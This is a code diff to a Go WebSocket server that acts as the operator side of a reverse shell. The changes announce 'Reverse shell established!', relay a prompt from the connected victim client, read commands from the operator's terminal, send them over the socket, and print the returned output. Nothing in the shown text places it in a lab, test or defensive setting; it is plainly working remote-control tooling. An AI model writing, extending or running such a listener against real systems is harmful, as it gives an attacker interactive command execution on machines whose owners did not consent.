@@ -8,6 +8,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"strings"
 
 	"github.com/gorilla/websocket"
 )
@@ -66,10 +67,21 @@ func handleConnections(w http.ResponseWriter, r *http.Request) {
 	}
 	defer conn.Close()
 
+	fmt.Println("\nReverse shell established!")
+
 	for {
-		// Read command from server input
+		// Read the prompt from client
+		_, promptBytes, err := conn.ReadMessage()
+		if err != nil {
+			log.Println("Error reading prompt:", err)
+			break
+		}
+
+		// Display the prompt without newline
+		fmt.Print(string(promptBytes))
+
+		// Read command from user input
 		var command string
-		fmt.Print("Enter command: ")
 		reader := bufio.NewReader(os.Stdin)
 		command, err = reader.ReadString('\n')
 		if err != nil {
@@ -77,8 +89,10 @@ func handleConnections(w http.ResponseWriter, r *http.Request) {
 			break
 		}
 
+		// Trim the trailing newline
+		command = strings.TrimSuffix(command, "\n")
+
 		// Send command to client
-		fmt.Printf("Sending command: %s\n", command)
 		err = conn.WriteMessage(websocket.TextMessage, []byte(command))
 		if err != nil {
 			log.Println("Error sending command:", err)
@@ -86,11 +100,13 @@ func handleConnections(w http.ResponseWriter, r *http.Request) {
 		}
 
 		// Read response from client
-		_, message, err := conn.ReadMessage()
+		_, output, err := conn.ReadMessage()
 		if err != nil {
 			log.Println("Error reading response:", err)
 			break
 		}
-		fmt.Printf("Command output: %s\n", message)
+
+		// Print the output without additional formatting
+		fmt.Print(string(output))
 	}
 }
